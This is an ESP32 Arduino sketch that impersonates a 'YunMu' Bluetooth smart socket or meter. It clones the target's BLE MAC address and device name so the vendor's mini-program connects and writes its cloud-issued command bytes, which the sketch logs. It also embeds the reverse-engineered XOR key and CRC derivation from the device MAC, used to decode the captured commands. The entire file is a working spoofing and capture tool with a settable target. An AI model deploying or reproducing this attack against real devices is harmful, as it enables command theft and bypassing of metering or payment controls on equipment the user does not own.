// Impersonate a YunMu socket, INCLUDING its BLE public address, so the
// mini-program connects to us and hands over the cloud-issued command bytes.
//
// Set TARGET to the meter you want to impersonate.
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>
#include "esp_mac.h"
#include "esp_system.h"

static const char *SERVICE_UUID = "49535343-fe7d-4ae5-8fa9-9fafd205e455";
static const char *CHAR_N = "49535343-1e4d-4bd9-ba61-23c647249616";
static const char *CHAR_W = "49535343-8841-43f4-a8d4-ecbe34729bb3";

// Set these to the meter being probed. DEV_NAME must be
// "YUNM" + the MAC bytes reversed, uppercase.
static uint8_t TARGET[6] = {0x26, 0x01, 0x15, 0x04, 0x2F, 0x96};
static const char *DEV_NAME = "YUNM962F04150126";

static uint8_t XORKEY = 0;
static uint16_t CRC_INIT = 0;
static uint16_t CRC_POLY = 0;

BLECharacteristic *chN = nullptr;
BLECharacteristic *chW = nullptr;
volatile bool connected = false;
static uint32_t writeCount = 0;

static uint16_t crc16(const uint8_t *d, size_t n) {
  uint16_t t = CRC_INIT;
  for (size_t i = 0; i < n; i++) {
    t ^= d[i];
    for (int b = 0; b < 8; b++) t = (t & 1) ? ((t >> 1) ^ CRC_POLY) : (t >> 1);
  }
  return t;
}

static void dump(const char *tag, const uint8_t *b, size_t n) {
  Serial.printf("%s len=%u ", tag, (unsigned)n);
  for (size_t i = 0; i < n; i++) Serial.printf("%02x", b[i]);
  Serial.println();
  Serial.flush();
}

class SrvCb : public BLEServerCallbacks {
  void onConnect(BLEServer *s) override {
    connected = true;
    Serial.println("=== CONNECT ===");
    Serial.flush();
  }
  void onDisconnect(BLEServer *s) override {
    connected = false;
    Serial.println("=== DISCONNECT ===");
    Serial.flush();
    BLEDevice::startAdvertising();
  }
};

class WriteCb : public BLECharacteristicCallbacks {
  void onWrite(BLECharacteristic *c) override {
    String v = c->getValue();
    const uint8_t *p = (const uint8_t *)v.c_str();
    size_t n = v.length();
    writeCount++;
    Serial.printf("### WRITE #%u ###\n", writeCount);
    dump("RAW", p, n);
    // de-obfuscate with the target's XOR key, for readability
    uint8_t dec[64];
    if (n <= sizeof(dec)) {
      for (size_t i = 0; i < n; i++) dec[i] = p[i] ^ XORKEY;
      dump("XOR", dec, n);
    }
    Serial.flush();
  }
};

void setup() {
  Serial.begin(115200);
  delay(400);
  CRC_INIT = (uint16_t)(TARGET[5] + TARGET[4] + 10);
  CRC_POLY = (uint16_t)(((TARGET[5] + 11) << 8) | TARGET[4]);
  XORKEY = (uint8_t)((TARGET[0] + TARGET[1] + TARGET[2] + TARGET[3] + TARGET[4] + TARGET[5]) & 0xFF);
  Serial.printf("\n\n>> target bt=%02X:%02X:%02X:%02X:%02X:%02X k=%02x init=%04x poly=%04x\n",
                TARGET[0], TARGET[1], TARGET[2], TARGET[3], TARGET[4], TARGET[5],
                XORKEY, CRC_INIT, CRC_POLY);

  uint8_t sta[6], bt[6];
  esp_read_mac(sta, ESP_MAC_WIFI_STA);
  esp_read_mac(bt, ESP_MAC_BT);
  Serial.printf(">> efuse sta=%02X:%02X:%02X:%02X:%02X:%02X bt=%02X:%02X:%02X:%02X:%02X:%02X\n",
                sta[0], sta[1], sta[2], sta[3], sta[4], sta[5],
                bt[0], bt[1], bt[2], bt[3], bt[4], bt[5]);
  esp_err_t e1 = esp_iface_mac_addr_set(TARGET, ESP_MAC_BT);
  Serial.printf(">> esp_iface_mac_addr_set(BT) rc=%d\n", (int)e1);

  BLEDevice::init(DEV_NAME);
  esp_read_mac(bt, ESP_MAC_BT);
  Serial.printf(">> now bt=%02X:%02X:%02X:%02X:%02X:%02X\n",
                bt[0], bt[1], bt[2], bt[3], bt[4], bt[5]);

  BLEServer *srv = BLEDevice::createServer();
  srv->setCallbacks(new SrvCb());
  BLEService *svc = srv->createService(SERVICE_UUID);
  chN = svc->createCharacteristic(CHAR_N, BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_NOTIFY);
  chN->addDescriptor(new BLE2902());
  chW = svc->createCharacteristic(CHAR_W, BLECharacteristic::PROPERTY_WRITE | BLECharacteristic::PROPERTY_WRITE_NR);
  chW->setCallbacks(new WriteCb());
  svc->start();

  BLEAdvertising *adv = BLEDevice::getAdvertising();
  adv->addServiceUUID(SERVICE_UUID);
  adv->setScanResponse(true);
  adv->setMinPreferred(0x06);
  BLEDevice::startAdvertising();
  Serial.println(">> advertising");
  Serial.flush();
}

void loop() {
  static uint32_t last = 0;
  if (millis() - last > 10000) { last = millis(); Serial.println("alive"); Serial.flush(); }
  delay(50);
}
